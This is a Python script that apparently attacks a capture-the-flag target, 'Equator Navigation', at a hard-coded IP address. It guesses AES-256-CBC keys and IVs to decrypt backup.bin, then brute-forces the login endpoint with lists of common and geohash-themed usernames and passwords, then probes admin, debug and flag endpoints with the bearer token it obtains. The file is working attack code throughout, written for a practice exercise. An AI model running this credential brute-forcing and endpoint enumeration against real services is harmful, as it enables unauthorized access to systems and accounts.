#!/usr/bin/env python3
"""
Crack Equator Navigation System
"""

import requests
import jwt
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

TARGET_URL = "http://138.199.163.92:12973/"

def analyze_backup_crypto():
    """Analyze backup.bin for crypto patterns"""
    print("="*60)
    print("Analyzing Backup.bin Cryptography")
    print("="*60)
    
    with open('backup.bin', 'rb') as f:
        data = f.read()
    
    print(f"[+] Data length: {len(data)} bytes")
    print(f"[+] Hex: {data.hex()}")
    
    # The challenge mentions AES-256-CBC
    # AES block size is 16 bytes
    # 48 bytes = 3 blocks
    
    print(f"\n[*] Trying AES-256-CBC decryption...")
    
    # Common keys related to the challenge
    potential_keys = [
        "nullisland",
        "u000",
        "geohash",
        "equator",
        "0,0",
        "00",
        "latitude0longitude0",
        "primemeridian",
        "gulfofguinea",
        "atlanticocean",
        "nullisland_u000_geohash",
    ]
    
    for key_str in potential_keys:
        # Try different key derivations
        keys_to_try = [
            hashlib.sha256(key_str.encode()).digest(),  # SHA256
            hashlib.md5(key_str.encode()).digest() * 2,  # MD5 doubled
            key_str.encode().ljust(32, b'\x00'),  # Padded
        ]
        
        for key in keys_to_try:
            # Try with different IVs
            ivs_to_try = [
                b'\x00' * 16,  # Null IV
                hashlib.md5(key_str.encode()).digest(),  # MD5 as IV
                data[:16] if len(data) >= 32 else b'\x00' * 16,  # First block as IV
            ]
            
            for iv in ivs_to_try:
                try:
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    decrypted = cipher.decrypt(data)
                    
                    # Try to unpad
                    try:
                        unpadded = unpad(decrypted, 16)
                        text = unpadded.decode('utf-8', errors='ignore')
                        
                        if 'kaal{' in text.lower() or all(32 <= b < 127 for b in unpadded):
                            print(f"\n[!!!] POSSIBLE DECRYPTION!")
                            print(f"    Key string: {key_str}")
                            print(f"    Decrypted: {text}")
                            
                            if 'kaal{' in text.lower():
                                print(f"\n[!!!] FLAG FOUND: {text}")
                                return text
                    except:
                        # Try without unpadding
                        text = decrypted.decode('utf-8', errors='ignore')
                        if 'kaal{' in text.lower():
                            print(f"\n[!!!] FLAG FOUND (no unpad)!")
                            print(f"    Key string: {key_str}")
                            print(f"    Decrypted: {text}")
                            return text
                except Exception as e:
                    pass
    
    print("[-] No valid decryption found")
    return None

def brute_force_login():
    """Brute force login with geohash-related passwords"""
    print("\n" + "="*60)
    print("Brute Forcing Login")
    print("="*60)
    
    session = requests.Session()
    
    usernames = ["admin", "root", "user", "geohash", "nullisland", "equator"]
    
    # Generate geohash-based passwords
    passwords = [
        "u000", "s000", "7zzz", "pbpb", "gbpb",  # Various geohashes
        "nullisland", "0,0", "00", "0.0",
        "geohash", "equator", "meridian",
        "latitude", "longitude", "coordinates",
    ]
    
    # Also try geohash of Null Island with different precisions
    # u000 is precision 4, let's try others
    for precision in range(1, 10):
        passwords.append("u" + "0" * precision)
        passwords.append("s" + "0" * precision)
    
    for username in usernames:
        for password in passwords:
            try:
                resp = session.post(
                    TARGET_URL + 'login',
                    json={"username": username, "password": password},
                    timeout=5
                )
                
                if resp.status_code == 200:
                    print(f"\n[!!!] LOGIN SUCCESS!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    print(f"    Response: {resp.text}")
                    
                    try:
                        data = resp.json()
                        if 'token' in data:
                            return data['token']
                    except:
                        pass
            except:
                pass
    
    print("[-] No valid credentials found")
    return None

def test_with_token(token):
    """Test endpoints with token"""
    print("\n" + "="*60)
    print("Testing with Token")
    print("="*60)
    
    session = requests.Session()
    headers = {"Authorization": f"Bearer {token}"}
    
    endpoints = [
        '/admin',
        '/api/v3/geohash-debug-2025',
        '/api/flag',
        '/api/transmission',
        '/api/decrypt',
    ]
    
    for endpoint in endpoints:
        try:
            # Try GET
            resp = session.get(TARGET_URL.rstrip('/') + endpoint, headers=headers, timeout=5)
            print(f"\n[+] GET {endpoint}: {resp.status_code}")
            print(resp.text[:500])
            
            if 'kaal{' in resp.text.lower():
                print(f"\n[!!!] FLAG FOUND!")
                return resp.text
            
            # Try POST with geohash data
            if 'geohash' in endpoint or 'debug' in endpoint:
                resp = session.post(
                    TARGET_URL.rstrip('/') + endpoint,
                    json={"lat": 0.0, "lon": 0.0, "geohash": "u000"},
                    headers=headers,
                    timeout=5
                )
                print(f"\n[+] POST {endpoint}: {resp.status_code}")
                print(resp.text[:500])
                
                if 'kaal{' in resp.text.lower():
                    print(f"\n[!!!] FLAG FOUND!")
                    return resp.text
        except Exception as e:
            print(f"    Error: {e}")

def main():
    print("Equator Navigation - Cracking")
    print()
    
    # Try to decrypt backup.bin
    result = analyze_backup_crypto()
    if result:
        return
    
    # Brute force login
    token = brute_force_login()
    
    if token:
        # Test with token
        result = test_with_token(token)
        if result:
            return
    
    print("\n" + "="*60)
    print("Need more investigation")
    print("="*60)

if __name__ == "__main__":
    main()
